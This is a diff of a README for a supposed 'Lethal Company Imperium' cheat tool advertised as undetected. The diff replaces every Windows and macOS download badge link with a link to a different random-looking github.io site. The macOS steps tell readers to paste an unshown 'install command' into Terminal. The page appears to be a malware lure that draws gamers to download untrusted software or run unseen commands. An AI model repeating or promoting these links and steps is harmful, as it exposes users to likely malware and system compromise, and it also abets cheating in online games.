@@ -1,9 +1,9 @@
 # 🎮 Lethal Company Imperium Tool — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://vkbcfwqqceuz.github.io/windows-setup2/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://vkbcfwqqceuz.github.io/macos-get2/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://vkbcfwqqceuz.github.io/windows-setup2/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://vkbcfwqqceuz.github.io/windows-setup2/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://fpvqciovatyi.github.io/win-client2/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://fpvqciovatyi.github.io/macos-release2/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://fpvqciovatyi.github.io/win-client2/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://fpvqciovatyi.github.io/win-client2/)
 
 > The most trusted **Lethal Company Imperium Tool** for 2026 — operates as a standalone utility with no game process injection, providing a safe and undetected experience.
 
@@ -45,14 +45,14 @@
 5. 🎮 Launch **Lethal Company Imperium** and enter a match
 6. 📋 Press **INSERT** to open the overlay menu
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://vkbcfwqqceuz.github.io/windows-setup2/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://fpvqciovatyi.github.io/win-client2/)
 
 ### macOS
 1. Press ⌘ + Space, open **Terminal**
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://vkbcfwqqceuz.github.io/macos-get2/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://fpvqciovatyi.github.io/macos-release2/)
 
 **Menu Controls**
 
